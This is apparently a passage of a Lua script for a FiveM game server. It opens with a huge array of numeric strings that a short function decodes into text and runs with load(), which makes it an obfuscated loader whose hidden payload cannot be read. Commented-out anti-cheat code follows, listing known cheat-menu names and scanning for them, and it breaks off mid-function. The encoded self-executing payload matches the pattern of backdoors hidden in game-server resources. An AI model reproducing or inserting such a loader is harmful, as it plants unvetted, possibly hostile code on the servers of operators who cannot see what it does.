1","341032","713227","6010247","3411722","26999","5110741","9110916","5110129","184046","743439","727219","599710","9110944","63225","77740","339737","6210228","7010538","689740","94402","673532","61501","554118","43344","974136","83213","191029","631012","11088","61153","471015","8210518","5910211","143237","87238","97971","31097","114636","64678","6411446","1110118","109744","4311632","4710114","607750","4710110","701108","3011717","4412616","196114","6911021","951053","4910821","943217","1911650","581042","9910147","8011049","791040","693218","521022","5611717","729919","7710745","7410915","6410110","304031","543420","63721","719717","810922","823246","407717","829744","5210227","510516","59736","264049","373522","415141","504123","983418","624127","593240","411015","671019","1210815","1311531","5510110","4510547","7710232","463233","877215","1511130","429716","5412018","137741","3210131","2611028","711726","2212617","746119","211036","3910532","410848","633228","6211610","9910421","510137","4811036","521015","643217","4210211","4511745","749920","1310721","841093","4910125","41404","66345","887241","991119","29726","8512011","93242","137745","2510145","341105","6011713","79347","47412","73241","46107","131015","801083","1711529","4910140","7810512","8510212","42327","88669","6710538","912247","4311026","2910115","4411516","794637","346731","6811450","5510139","629731","2711611","6910133","937711","9010113","2411043","721174","3012644","426126","8611050","5110527","1610821","93324","5611612","5010446","2910110","211101","491036","723248","10010233","8511739","999928","3210735","8910947","531012","734025","693446","346626","310542","4912231","3411045","551011","8211537","523214","22772","231016","3011012","5211747","793446","954131","61107","3110123","691089","411533","131017","610513","110236","163246","597032","1910130","211101","521008","7410521","8311012","658822","687732","7610138","10011046","7411740","984647","206720","351146","7410150","649734","5711638","4910149","177740","4010120","5911018","811713","8312637","896137","1001108","3910519","491085","543225","911613","5910439","151014","1511050","731024","5910211","931174","89925","1510716","5910913","661013","94035","243441","217045","21017","7511025","5610034","1710515","271205","513236","947723","7710132","7611014","421176","643447","83416","881023","4210116","2910827","321155","7710139","281056","3010245","653214","566549","1910833","9611231","521045","349735","938649","20464","426710","6411436","6810123","899718","791165","6210132","497729","8710121","7411043","8611723","3312633","48618","4411049","7310516","7710841","843244","1511619","4810423","3310150","6711034","801027","86329","371028","761173","289935","4210750","7110931","910129","324011","423449","786520","5210840","961126","361043","489740","17865","713232","157727","571017","3711044","3111750","903444","774123","271033","810114","2810813","4411526","710127","9410518","6510233","913242","826827","31014","6110138","4111441","984612","996724","371147","621016","439723","811166","6310126","89772","241016","3411029","1111711","51263","1006110","421107","7110528","8510828","813239","6611621","3010430","110130","8711014","761014","153247","9210240","6911740","589942","9210722","9810923","9510127","724030","363424","527637","9612121","8011029","5812046","353244","807739","3310140","9511020","9811735","98408","213534","675343","44415","833417","894138","881044","6910139","4510819","511515","4810122","711052","3410241","73213","557834","1912133","59801","9711410","3410137","8310949","7210531","711724","9710941","31465","20676","2111422","7010118","83977","5211630","7010138","857711","3010133","8811026","7211750","321267","206113","6011035","551056","7610811","963210","411621","2510418","3410132","711014","251029","83248","1910216","7411733","14993","5010711","4210945","2610150","344010","783431","778337","8910729","7110516","2610050","903250","477731","3910125","251101","301172","584036","553517","515228","854134","373420","744149","373218","941041","110138","841088","5311540","2910149","7310515","6710219","393233","3110811","557343","2210816","77312","2210844","5610830","497311","710819","627334","884615","986726","4611436","8210144","219727","7311626","821015","777724","51018","1311012","7111749","5512634","516143","2011018","801056","5410818","713242","5811616","6510415","2310138","9011028","151025","6325","6310210","1211738","219931","71074","261092","5410121","37405","643433","858531","3711049","110735","8311027","6411124","4611932","3611011","743249","237730","4610139","2511016","9711716","184037","663526","425124","804127","13343","414119","53107","891013","5810836","221153","7610139","6710528","3510230","433221","9811019","391173","5610715","5010126","6611540","6910142","321142","10011837","3210118","8811446","10012644","16617","6011032","8210510","1610850","43244","211610","441047","51012","3711037","331029","833211","8110233","9811740","449920","10010739","251098","8910113","64026","313440","217814","9611720","9110722","4210150","68323","228327","5610135","9211441","3711843","8610114","8911425","634039","77628","7112140","2411019","4212038","514138","523412","8411","761026","9210111","6910817","3811515","8310116","1910517","7810250","563215","2710132","6311542","571208","1310025","561013","4311527","7011636","881149","611111","6312110","211828","745040","5512648","856129","5711037","2410531","6010830","503228","611640","6210423","341018","7711024","14108","563220","61022","911722","179934","5010743","2610925","3510141","684020","643431","456819","651013","4411511","521163","501145","7211112","1312146","273223","697728","961017","7011010","4111723","28409","10867","245041","364135","803415","464121","621045","5410122","9410822","9011513","6410120","710521","10010239","333216","8511632","1310145","810842","8910117","211246","9311129","811148","7011628","178421","3011149","717810","3110136","25972","9411432","2110116","7011539","5411628","248633","3110141","961041","4810532","769912","7610817","591018","3112616","326119","21103","3710533","2510815","763237","7111614","941043","3010127","2211031","751050","923229","6810249","1811747","129935","7110733","9310912","410129","26406","913441","547632","2912131","211016","3712026","353211","447742","3510140","791108","4011745","444012","503533","65414","564139","783242","94493","163439","714130","231024","8410132","6910814","5511513","2010135","211057","110238","23224","666547","651009","61004","408433","7910134","741085","7610143","9911237","1811138","10011446","111612","437716","6910144","6011025","421173","6112638","89619","5211036","5310542","3010827","223244","5011648","7410410","2710132","6311011","531021","86326","151027","111716","939943","2710730","8910943","1010116","174015","68347","75768","1212128","2311045","5612034","83245","1007745","5610145","1711019","5711722","174013","773539","215432","234144","13323","855023","153418","944114","46323","61037","71011","641089","581156","4110134","2510513","161022","9329","856515","3010915","66981","7611716","9410814","979730","6611036","10992","3010140","548032","801087","619722","5712130","8610140","811435","5911544","61262","1006120","8611022","6610519","10010817","593242","4111614","8210421","4210147","6311041","71025","203239","651021","1311741","129915","3910722","441096","1910130","194018","403435","737639","8412137","3011041","3012021","43227","427728","631011","4011012","4411743","624047","753534","125410","18419","143214","63514","47346","1004114","993241","141011","1110126","9410827","3911535","3010122","1310516","8710225","283224","96539","3310539","6410921","549834","8411142","2611635","821261","706116","3511021","7710526","310820","423239","5711628","2410434","510148","4811033","891026","46326","3410228","4711738","139949","710740","3610937","310116","44018","653422","42764","8112111","5611012","4812018","223235","1007719","6010142","8711020","9211743","434014","473542","10543","954135","453232","97521","73431","35416","26327","91016","5110130","8010838","9911519","2910139","801055","231024","333239","488241","469719","911234","8510144","556521","2510835","2210828","887025","5911736","891101","359934","51268","716117","4311048","2310528","4810830","443215","1611650","4110450","5110123","8411030","291028","583248","1710249","1811717","99920","5810728","1710950","2510130","82402","7346","587641","2912137","1411020","7212026","123226","587732","2210120","1511024","51176","63407","493546","38541","734148","973231","965333","2348","764118","623230","211015","9610132","781082","1411532","9710132","7910535","861027","34327","366747","7911410","559746","5711528","7210421","558029","5610842","679721","1112140","2610112","9911438","5612636","38612","5411042","311057","4010817","89328","9811639","8210423","4210127","901109","251040","893238","3610235","4911710","879940","6710710","541094","1910132","574029","553448","547639","1912129","3111049","171202","553238","19776","8910141","1111015","241171","88406","233513","135432","424146","43237","23549","113410","164129","243220","281027","6110140","6210822","1911535","381016","9510526","5310249","753221","91699","9998","2111123","5011045","10011119","9610913","2812141","95689","5410137","5611538","9811642","4111430","7911136","581218","1010111","4511416","655028","6812633","576147","211050","5510524","4410817","623232","1411637","9210419","8710132","6111010","261044","353211","5410242","4911719","259912","3410749","4410937","8310135","984010","663417","326919","549913","531117","3711040","7611149","1710943","712140","453235","816845","881019","3211546","311627","3111443","951112","6412146","3210114","761148","43242","747739","410143","881105","951178","63446","634139","761023","1010116","7410818","9311545","6410110","5710516","1810243","633211","35989","809733","3011016","209748","291105","929722","371126","589731","1611423","6611628","4912145","40979","1810838","9710846","701262","876129","511038","1410548","6510833","29323","4411643","681048","310126","1611045","201029","7210234","471173","96996","1010716","1010913","1810135","494015","263450","5853","141103","9110729","201101","5111135","9911926","3911043","473216","87726","4710137","2711046","9511720","563241","524020","53543","775237","174114","13450","824127","83102","3510128","1010842","4111512","9610146","2110546","191024","173218","719918","60972","5310350","3110115","7811232","7810850","439713","9112123","11017","7711411","1312621","576116","711021","2410537","2510824","663236","7611615","1410423","9210129","171108","89107","853230","4410246","2511720","829916","110711","7210928","3310146","624033","943446","168532","8611041","901075","7511031","3011129","6811926","1211023","983226","47714","710147","7511019","971176","463238","344019","836713","759719","3410329","810150","293223","64805","2010832","69750","8912130","4310111","81141","74419","703443","204125","821043","3810129","3010828","761156","1210126","771058","5610241","713224","611437","689736","211216","131019","3511250","8010840","97975","9212150","1910148","4011447","812638","72616","741101","5510536","6910822","483221","191166","610418","741019","6411046","531021","933249","2610213","9911712","859921","5010718","5910940","410121","334046","193431","118516","1511030","8610715","891107","6811126","2111949","2311038","993221","697712","9210147","10011047","9511717","673221","77405","958217","609717","6211212","5810134","20324","1008038","9010823","729749","9412139","9710118","7811436","914140","743422","164144","57325","631012","5410131","8710844","4511541","2710122","2810527","3910226","843246","729825","79723","211029","45979","7711029","8978","7011225","94979","10011450","9711624","2312140","2312621","376131","51103","2110511","3510828","413211","931168","4810419","310143","11102","931030","303214","8510235","9111726","1009943","81077","991097","7210150","384015","76349","708542","6411039","7410723","8011030","2711141","7711950","1111027","853241","757725","310149","3111049","9711727","183248","784022","4358","515312","56412","933445","634111","621031","3110142","8510815","361153","3910111","5210513","7210232","473219","601075","6510128","6812138","723243","712641","100617","463216","6211031","7110517","7010828","713241","3011626","121047","4310119","9711036","971041","833225","6410221","2211744","999945","2310742","4910950","310141","66404","3348","4011816","4710122","4811026","3810139","181102","4411126","193420","694147","821041","8310134","361083","9211537","941018","1510510","5810216","65324","7711715","891106","3311650","7010144","8411512","4311619","4410124","341007","264640","611158","2211618","229725","631161","9510115","153217","8512629","586122","423241","211108","7310533","9210836","923230","9211635","1110419","4210110","3311013","88108","373233","2610236","2211748","19921","110734","110923","1210126","384023","303445","31843","5210531","749749","5010321","2011132","40401","55854","7911214","941009","41975","721166","7210147","6310043","754114","13233","397947","3411427","523240","918325","1410730","8610525","8710023","343250","27745","181018","6411031","7711715","693422","454146","69326","161039","1210130","7010815","8611530","3610139","8410538","1110249","493234","27696","788832","89845","678225","52693","797740","846936","1469","801009","8110114","539810","1111725","9210328","553215","412650","626139","293244","931108","4010516","9110837","253240","61169","621044","4010127","8411022","881043","353246","5410250","3111745","37996","1610715","3110944","221012","514031","453442","446916","158812","708413","998233","256918","47722","956941","103245","57732","181016","5911034","3711722","24349","814130","691036","1610127","10010817","3211517","410111","5710543","5610242","113217","771004","1110120","1911849","810142","6210848","10011134","7811242","7010145","8211436","911550","979143","754916","599343","373243","112610","656130","26329","1311019","1910531","4710846","43223","771166","931047","4610124","3811018","181033","403249","3610237","111721","829932","9410734","1710946","501016","314034","923410","698328","5910710","7910531","3410015","547712","410147","7911034","10011743","953220","107935","7511447","353227","98417","7110525","229742","9110319","111110","174040","623540","335032","304116","593415","67411","111035","2410120","851082","4011516","871016","711056","2710219","813212","3411442","6211129","8111116","201166","897724","31017","9911041","111721","754633","87676","3811417","421014","819737","2811642","7410121","477750","510116","5811036","7311720","863239","641268","906121","383217","3611022","601051","351089","983248","8511615","1310439","9210118","8011037","96101","553228","8910245","3011711","379938","881075","1001097","110117","724018","98342","148228","711142","1611145","4511632","673240","31773","471012","9911018","4311735","13424","884141","531034","3310129","3410836","4711514","8710150","5610522","2710223","213225","311938","473229","2812629","596126","183227","9911050","5610520","9710826","213219","773215","931161","401043","9110114","8811018","311040","263228","8110230","1911719","87994","3210736","5810946","2910146","774037","59349","178534","141106","5510710","7211019","4011110","251194","1211020","1003216","367734","5710110","4211040","611734","334021","933544","634939","154147","32344","14419","81043","210132","281088","7311532","7510114","5010537","9310224","293214","3910430","623211","1912646","436129","273218","4111033","231057","4010843","59323","321163","1710431","2910121","431103","261031","423231","911028","4211739","219948","6110718","211091","110140","57403","123421","438542","2811020","410732","3311050","811111","5211943","1611028","383232","917733","3110112","4511013","6711737","604023","29352","235027","884126","68344","54411","1108","6710141","710818","5811515","5210143","21059","6710244","1003219","3811116","13983","8310822","735022","394619","51006","4610141","879831","441179","7910329","753232","2812629","36133","203245","4811011","591058","421084","403217","511139","911448","473229","8110842","410830","9810818","991081","905242","455614","475521","815244","443224","5312616","35611","423212","5211033","2910531","291085","283247","211120","5411410","68321","697541","89659","67753","15653","386511","937532","94657","697549","626517","21756","523216","4312643","4612","183226","411036","9910543","10010824","333211","811111","4911413","67326","50987","7111744","1912129","6810134","8611443","6011527","7310139","3811413","4610550","499726","410833","763234","3912631","206123","793217","111044","6310536","741084","563242","6511115","4911450","293214","597145","3410336","6710330","7510313","1510337","253245","941261","46149","53326","1411024","4810511","8710826","703221","11164","7910439","2510136","5611044","351018","30327","6110242","7711750","129917","511077","4710922","3310149","204039","853424","817913","669819","6110833","1010519","811821","3410540","2811745","4611525","743225","547740","461014","2411037","5111750","993442","744117","191018","2110133","6110822","7411521","411015","261057","7910218","363240","957729","7311136","211174","7411044","9811629","10735","431105","728229","629738","6011017","9310337","810131","383210","1712649","936138","273216","2111013","710514","7410814","853219","2011623","910423","7610136","5011031","921032","423211","121021","721179","339950","1110715","9410935","610128","344025","153411","197719","911145","511711","231104","2211611","863221","517747","410124","8411026","1611745","213443","294136","151022","2210115","1010815","2911544","8310146","1510531","3110235","163211","228231","9710535","489934","7010432","93652","3111515","661157","821019","311640","61329","9012633","706145","43247","1411024","4510542","4710824","343223","4111648","5610444","5710120","3511045","461035","943214","7110244","251174","549930","8010732","491097","391011","57408","563426","617734","299742","1710125","1611529","7211642","2411446","3411112","13235","887715","581017","6711035","5411714","684039","593513","36509","424136","963447","944118","651018","3310145","1310814","8911524","610138","4510544","1610210","1003218","137023","5011136","2210816","5010816","8311142","4311922","803234","341269","646120","773247","6811014","7610525","1610849","503216","3011632","6110433","4010132","701105","921023","163217","721027","6911734","329929","6610750","3610913","8510143","164038","443420","567614","812128","9211046","6712024","403236","857728","5410113","741103","1711748","914025","623530","265050","414117","593443","264144","70109","6210148","741088","5711534","6210140","4510550","2910216","723250","5910935","7010446","509749","6811150","6511047","8211040","67327","601263","456116","63249","6911037","7210540","41086","273230","411631","210413","201012","2911020","491013","433215","461025","211733","439947","671073","7610943","61018","834046","713422","657625","9812117","7511035","9012046","213218","277730","5810122","6711017","5311714","834033","863528","895143","874117","15343","674118","82103","3610125","1310845","7411544","731016","4410524","4110224","153237","13898","833241","4912616","606115","583238","1511045","321052","3910838","213219","2111611","6510434","9910123","7811014","851040","893239","1810217","4211710","479929","6510748","9510925","9710116","15406","943412","857341","9711423","4011115","9011044","123240","23667","561149","271012","3711925","8323","757748","3610134","8811027","1911720","573410","774129","531016","710127","3110846","6311526","4310116","1610534","841022","533228","36724","5411135","1010846","811118","9911740","281147","2611540","1008037","60972","4211011","4410137","9910817","864620","58728","129718","710521","1511429","156717","1211743","6611632","573238","1812647","22617","233210","8711039","8010519","471081","563246","111625","371047","10010131","6711025","37106","173224","5610242","3911750","549942","7510724","6410950","4510112","794021","93347","247225","3011128","13976","3512022","223241","547723","9710125","7411044","3311717","933432","484127","751039","8210131","610845","5111541","4010145","7210524","6010219","143238","2210811","679526","2811936","921014","949732","4911222","3811128","6411021","841153","254642","877750","7810145","7410820","610139","2410113","613247","6012641","436139","913224","8211016","721053","2710836","213227","911161","5810443","5710150","91107","61029","373230","5610238","4211746","759914","210749","6910912","8310138","934033","963440","57015","321058","8411047","471101","557349","3611535","436543","628339","6810714","7310539","4610019","903230","82771","8810117","1811029","4511737","353441","14138","641040","8710132","161089","6911543","6410137","7110524","210239","17324","277042","5910149","3711041","2910038","1410530","881104","868823","994623","1910012","81014","509827","5211728","910313","803226","3612610","166143","373218","3211030","9910541","6910819","43215","8311615","4410448","3810110","9911048","30101","813227","6910227","8511724","93991","611071","5110945","6110132","244013","553437","127014","7810113","811106","810027","6910531","2311033","638819","53328","447715","6310125","511018","8611711","454039","503521","40504","24145","43420","89413","221029","9410148","8510812","751156","610121","2310548","431027","813222","27211","353219","6012644","206121","783221","551102","3110521","5810819","38321","3411628","1910414","31014","5311032","631050","72327","4210224","6111728","479928","10010717","5310924","2310145","474026","183439","717644","5112149","751108","4512040","223218","857741","6110142","771106","1411740","494029","763518","10513","964120","533423","224111","311038","7910113","7210819","791156","7810130","1210541","741021","223232","456738","3111431","2411742","9411545","739738","641003","3710117","4311424","804618","9910014","610118","269818","7211714","1910316","853230","661263","56123","933211","341105","8610544","1610848","333216","3111649","8810413","1110119","1411035","461018","83215","2310211","5611738","709910","2810713","2410920","6610143","184022","543423","46744","491146","8711710","491151","149722","7210017","761015","3511444","693229","98775","7510137","5911049","1111730","813444","74112","161019","4410130","2210819","431151","3510136","1710544","8610250","723228","336532","8410815","8811913","349719","2612124","1711539","347530","20977","510245","8410247","26977","314640","7110044","9110144","379828","991172","4310329","88325","3612613","746131","113226","3111025","8810521","681081","683241","1011625","510418","711017","9811028","471018","703247","131025","2111712","399924","161077","1010911","1110121","84405","703438","54657","7210823","5311235","631045","749747","693217","34831","94971","6210229","3810137","353237","667748","5110111","411102","4811732","75341","694147","941033","8110136","7510822","4511520","5810117","4610519","8810240","823230","847834","1612146","9211939","9311746","299938","351163","6211537","956511","325240","36624","776824","745247","50989","155135","929512","27128","604810","613245","6512638","256147","203222","9711049","5410518","810850","963241","7111137","7411418","473217","49951","131122","1511419","411058","8711050","9211613","22322","251268","756129","293245","4411023","6910530","131087","75321","3611612","3710430","7310130","5511012","291014","83218","9810215","7111723","659939","6410736","691095","6310150","864030","353433","256838","4711131","9611218","9971","541098","9510546","7411049","310121","453240","987733","6110112","21105","9511727","763415","34118","51102","911019","5910831","5611545","1910111","4410521","2710225","543232","1710544","926641","1710943","457532","897750","587446","815231","826819","525547","837522","243243","811268","12611","73236","881107","3910519","3110825","21327","1011639","1410413","6710122","8411039","351025","763217","6610239","921175","96991","510721","2610930","2310144","534040","643420","178222","301016","211848","3510121","6810835","811112","3411716","311645","910516","2211114","6811026","233250","887719","8910112","4011012","3311744","38341","304130","581037","3610122","1410818","8711546","1610111","4810540","8910228","943230","7610727","10010513","161083","1710836","510950","101014","4611047","5111750","819510","1411836","199713","9010849","581174","6010140","53240","4412612","96614","643229","1811033","3410536","4810817","303214","861165","3710412","1910111","3111032","871027","1326","793232","5510234","4611731","249945","4210746","910920","9410121","844011","53420","908737","9110537","4612239","579722","1411433","1210030","233227","387718","1410114","9111044","10011739","723430","96418","331045","2510134","581082","5311542","8710117","5410532","2210217","553211","801028","717249","337825","8412220","1110336","5712033","8311322","508417","1711748","32866","2511244","514946","908435","536816","82876","138042","65529","786638","6845","777948","668328","9310842","1310129","628523","1510934","951126","688619","775318","66544","487243","4512239","121072","369845","928733","3812150","717543","10525","21875","408745","891133","9110024","198836","886938","9312232","316910","618645","601115","416518","498545","77503","497739","9782","823216","7312642","84614","533235","961103","2710527","2510850","25328","5311616","3110425","1710134","5711021","511048","103240","33242","210224","1811724","939947","510728","441091","7310116","544037","643444","658722","51976","1111818","4510141","793242","807710","8810115","111018","231178","39348","434139","21029","1410131","5610828","5411549","2610148","7110550","9210240","693231","1611134","955112","678250","207725","879814","12488","60657","997616","17569","828910","704814","948723","7711928","6512219","3810741","9011450","40788","564817","30551","338244","465415","776726","857328","55843","321088","357322","2811114","598546","195642","381049","3611446","7510439","696547","815743","7910110","688722","14849","897217","119940","1712149","68973","21535","377732","475031","985634","425050","29658","3910334","978126","538326","158739","8312234","198129","8510438","2311127","97832","8911615","598145","9312137","7511819","997537","995325","487141","14742","56806","20795","3011613","505736","51179","683247","9712636","72616","993249","2911033","8210512","7210826","493226","9411617","1410425","4610135","2111039","981022","63221","57325","510232","71173","19929","5910749","411092","7810111","81401","853444","158213","7910512","391115","1001161","53217","677718","1510117","1011049","611730","363418","934131","411020","1001019","2110820","6011518","7610144","310549","7010246","283237","5211045","6511120","729936","2110819","2710550","3711223","54754","2110134","51211","29845","361056","7511034","2210021","623223","511269","736144","973238","9511015","2610522","781087","443218","6611121","2811426","243239","521023","1310523","6712014","789940","179748","8111417","697541","6010112","4412128","319811","510523","3011028","1310039","13224","8812649","326116","1003211","3911046","2410541","710838","693225","9011148","3911432","633240","1910441","521015","539737","1210842","9911226","9310819","319741","6512146","8210138","281145","837538","9310145","312127","579824","3910527","4811043","6310028","743233","7712614","516122","853216","3211034","1910522","3410825","453225","6711131","851145","573242","59698","938341","168020","716848","3110515","5611521","521165","62975","6911027","489935","8010110","417914","5611237","8511543","373243","1012623","936144","503236","791107","7910548","971089","973232","1811113","5211445","64321","138027","810130","7810036","926516","5211650","111166","569747","759943","2010732","67937","911249","4811539","363220","7912643","21617","99325","401103","631054","2810830","513233","761111","451141","873238","948037","3510145","381008","916522","8611612","5311627","69750","549921","2010737","808449","681218","6411249","4310132","93232","4412633","876132","513233","6811026","8210523","4210850","323214","6911134","3711444","333230","867116","2711436","149718","511188","956536","4210918","7611112","3011731","6411018","3311618","133233","7112632","20615","453213","7311032","2510544","7410843","163225","5811113","4311438","503244","68326","7711247","8110150","681013","831001","697742","8011130","9910021","837922","8311226","9211535","753242","2112617","216123","853233","6411032","731058","4710849","963218","1211126","1511447","55327","586522","3610528","2610910","999837","8411138","9611615","57662","9011129","131103","131011","57798","5211233","1911529","60322","6312613","406135","873247","1311014","5810515","2010831","43324","6111640","811048","1910114","5411019","851030","11329","2510212","9011739","959923","410748","6110934","3910110","264046","13414","128322","10010748","810521","871004","263214","267719","8610124","2811031","631174","334021","11357","555340","184115","763431","884119","201022","510128","7910848","9011540","1510145","9510514","361022","353215","4511535","2810425","691119","2111948","738014","8010840","519741","271212","2210144","9411416","926647","781085","4110528","761121","8211535","693211","3612621","506145","4324","5211017","5610537","7710822","93237","8811142","5011424","41328","441051","581031","8411038","8411116","5311445","4010147","178026","2210836","409718","4812113","4210112","1011427","837831","309711","9210945","7310125","286830","2910537","311549","111650","309726","1511034","459928","610119","643231","6812610","126133","423221","9911048","2710510","7510829","833240","3211120","91143","983223","7311243","8310835","789711","1812144","2610119","5911433","85787","859733","110922","7210126","7211515","656838","3010528","2911520","3011611","83213","1312642","726142","263241","7311029","7410511","9410830","913234","2111133","841141","93218","7110028","7210520","3711516","8711241","401084","159710","9812140","497333","746816","887229","710123","3210542","9010343","2310444","5111628","63243","4512629","456117","953231","6211012","210547","4010845","723236","571118","521144","833226","4710134","25803","311715","3111016","299926","5110430","323224","721265","57614","23223","9611034","4510536","4510828","283228","611148","1911443","823223","1711612","691048","2810138","911421","2310925","873245","841262","476115","473229","1511037","3410542","9010816","853223","9611120","9411444","663223","4010530","391105","3811837","4910538","8911538","76321","5112615","496146","233249","721102","4910510","491083","433232","10011117","5011427","183217","1810533","8211016","2311830","731054","911042","863229","8612639","166133","523217","911103","7410527","2810840","73211","1011112","6911434","233240","6811111","8111827","8910124","6911449","3411924","1711439","391058","6611611","4310129","146539","3510819","9911234","7210431","34977","743244","3312629","946119","37324","7911014","911053","310836","833221","411147","8311417","973247","9911537","967450","9811741","2310924","9511227","263224","6312621","936126","633234","8111033","6110549","4910844","183240","1411117","1511440","53247","18831","6311223","2810119","3810138","3310028","306832","941017","5010913","9011135","191106","633221","9312626","676139","423222","7711022","5010517","5910810","833231","5911628","8310435","310138","3011015","751028","443227","6610250","6111743","50993","4810728","9410934","310150","49402","43412","287920","431167","2510428","1710140","7611414","10326","197727","4310128","5211048","1411747","383434","17416","771022","5210133","7810827","3111548","4410114","7010521","2410233","873244","369541","9611531","410148","59941","2511426","271018","91161","937533","1010124","8512138","743240","841267","41613","343233","231107","3410550","8710827","54324","7511137","791145","78326","88955","1310945","6110144","211038","3911725","166738","811136","7210821","4311142","5311416","863225","461269","916126","423241","611022","2110537","251087","62327","9611640","7910439","9010140","4511020","381043","23231","463236","1110227","641173","45991","5410740","8010910","1510110","784046","103421","377631","6411734","8212027","553219","717735","1001013","1411023","3411742","58409","793530","345140","304125","303444","284148","891034","5310145","8310811","201154","6710132","9310538","6610236","11323","68912","388026","2410633","335714","7612245","49672","1006546","577032","108031","510013","105644","137743","5526","43210","7212624","776145","923241","2911044","10010520","1710831","52326","8011629","6110418","310121","1111043","58101","953227","79327","8610231","2611739","93995","9610746","10010927","2010140","474046","153419","576544","311165","5310318","613238","807750","4410123","7911010","4611716","123415","394117","1001034","5710135","7510817","6311547","9010134","10010529","21024","553215","781021","1311720","209913","3610730","7110944","341014","210042","649726","3010020","381006","7812133","523238","1812612","376129","14329","4111037","710526","3410817","493216","4811616","4410432","5110120","9011021","631035","853221","93218","8410223","2011723","88998","7910749","361097","2210134","73403","893446","1007020","359711","3610828","9810827","2811141","381176","3211648","303243","867711","431015","221102","7211733","253424","704112","793243","333235","221015","913236","5210138","6511050","8010015","311036","510114","5211017","901001","351022","710125","5311040","5510012","974113","891010","126528","8210016","5210049","636918","3411831","2910133","2511012","411633","177240","199719","521102","9610012","4710843","1610149","5811419","364019","633432","6011113","9311049","36728","7710824","7110513","4410112","9211020","5611627","128221","9110115","711545","7211128","1111741","461141","179935","1410119","518324","3311622","7511128","5511247","203447","53442","110242","911177","2411038","909916","2511612","3610545","6311119","9611021","964027","8211424","6810145","2811546","4511530","2311635","21115","5711236","2511018","389721","2310928","251011","1004149","371011","63242","833227","1003214","773247","3910547","7710236","473248","2411432","6310135","11158","2811517","9811627","9511124","151126","4611048","65973","9410944","241017","253216","966150","66126","173246","773446","92701","63739","72821","356913","686545","416740","20343","463248","9911614","9210437","7610140","311107","313213","29108","303219","13242","533216","753227","973237","393227","323210","783211","38328","458441","91142","851058","3510342","4310310","6110127","8211443","338339","481014","2111417","9111815","4310128","10011435","656921","381181","1010120","5711023","5611638","704023","403418","52652","5811047","541169","8810527","12731","41105","1810626","1910122","409914","3511640","68343","184432","583237","93716","6310122","6811614","15809","8410844","539710","9712143","551015","9811450","788339","7410111","5011441","9811845","3310132","8211424","937333","601006","934023","408012","5510810","90971","9812126","10010137","311438","917331","810011","974021","864145","24126","124433","643216","71717","921011","511620","158036","5910835","209717","2712114","8110149","4911426","617844","629723","1810921","671019","864038","998026","6810814","679711","1112119","6110134","9311447","837317","81003","93408","62416","484143","764448","83235","73416","806514","771102","41168","3610518","203246","317350","3811012","1610147","4310639","779936","6311618","83225","267919","9711018","323233","77823","7910145","9711548","541113","5411713","3811416","58991","2710129","643425","274435","43325","223432","228412","7111431","7312139","333228","797015","7911138","5511426","903210","447325","9211026","8610641","3810134","629911","8411643","123216","6911111","4911012","373211","4412114","271119","611726","6611430","513246","701146","7410119","1911531","21112","931174","7011423","319950","7810136","193447","76419","441041","42329","473242","913250","87329","7810134","6611045","4810047","223241","821034","3210144","9311018","5010047","294148","2105","2710227","791175","901102","389918","711637","5810517","1711129","671105","13324","7010215","9411747","109933","7610742","8710924","4310149","654029","718228","9310138","989739","631156","7011128","5911046","414134","771045","563221","973213","943218","973228","28430","5711424","8710548","7110338","1410312","210128","7211425","2831","341014","3611439","1311817","1610145","511418","36950","3311835","7910113","971107","3811642","204020","953429","56522","8911012","311634","4810524","967332","10011041","8710610","1810116","28996","5311638","48344","594446","283236","737124","911014","3311624","328035","310830","78972","1012124","9110122","2911449","9839","3610144","3511433","7811845","6910142","5411415","1007321","7410018","40403","918022","2510820","589726","7012127","1410125","9711421","657312","1210022","364041","744138","754137","174430","963233","62711","1610121","9711634","968050","5310836","329741","4612125","110128","3011413","177828","239724","10010946","3710148","74033","38016","3510838","1979","4012136","8410127","871149","277328","7210020","614023","264111","504125","584450","58323","253426","546529","11104","281168","3410548","453213","537313","1311027","1910129","9810633","879911","6311613","633229","557920","2911031","253211","268222","9710135","5111523","8511132","741174","6511423","27998","8510143","653415","594425","553210","89342","998413","851143","3512126","203213","31703","7711113","1611412","573226","507326","6911035","110625","9510148","109949","4111617","173217","6811110","3611019","203215","4612139","3211140","8611715","4811444","213247","1611441","731019","811538","7811121","2411729","5811440","179914","8110134","173421","964132","801037","1003229","413235","508729","2971","561055","2711645","714027","73537","28485","484138","261024","21017","2011013","4710034","101013","2711241","981146","161058","10011044","7511646","784015","443917","847027","96737","858236","326939","496511","506726","741947","5817411","313249","628035","811430","1611129","2711635","4010129","8995","141162","723236","498443","5010427","3010512","7611540","553242","468324","3910129","241143","3011819","6410113","9311436","39393","134140","33109",}} k = { [-3] = string.char, [-2] = string.len, [-1] = string.sub, [0] = tonumber, [1] = table.concat, [2] = load or loadstring, [3] = string.dump, [4] = math.random, [5] = math.randomseed, [6] = tostring, [7] = assert, [8] = loadstring, [9] = print, [10] = function(j) k[5](h[1]) ga = '' for n,s in pairs(j) do local f = k[6](k[4](100)) local z = k[6](k[4](50)) ga = ga .. k[-3](k[0](k[-1](s, k[-2](f)+1, k[-2](s)-k[-2](z)))) end k[2](ga)() end } k[10](h[2])
                        ]]
                        --[[ Deer = {}
 Plane = {}
 e = {}
 Lynx8 = {}
 LynxEvo = {}
 MaestroMenu = {}
 Motion = {}
 TiagoMenu = {}
 gaybuild = {}
 Cience = {}
 LynxSeven = {}
 MMenu = {}
 FantaMenuEvo = {}
 GRubyMenu = {}
 LR = {}
 BrutanPremium = {}
 HamMafia = {}
 InSec = {}
 AlphaVeta = {}
 KoGuSzEk = {}
 ShaniuMenu = {}
 LynxRevo = {}
 ariesMenu = {}
 WarMenu = {}
 dexMenu = {}
 HamHaxia = {}
 Ham = {}
 Biznes = {}
 FendinXMenu = {}
 AlphaV = {}
 NyPremium = {}
 scroll = nil
 zzzt = nil
 werfvtghiouuiowrfetwerfio = nil
 llll4874 = nil
 KAKAAKAKAK = nil
 udwdj = nil
 Ggggg = nil
 jd366213 = nil
 KZjx = nil
 ihrug = nil
 WADUI = nil
 Crusader = nil
 FendinX = nil
 oTable = nil
 LeakerMenu = nil
 local resname
 Citizen.CreateThread(function()
         resname = GetCurrentResourceName()
         Citizen.Wait(2000)
         while true do
             Citizen.Wait(2000)
             for f,g in next,_G do
                 if type(g)=="table"and f~="exports"then
                     if g.CreateMenu~=nil and type(g.CreateMenu)=="function"then
                         if f~="WarMenu"and f~="NativeUI"and f~="vRP"and f~="RageUI"and f~="JayMenu"and f~="VEM" then
                             fuckme("Menu With UI Funtion")
                         end
                     elseif g.InitializeTheme~=nil then
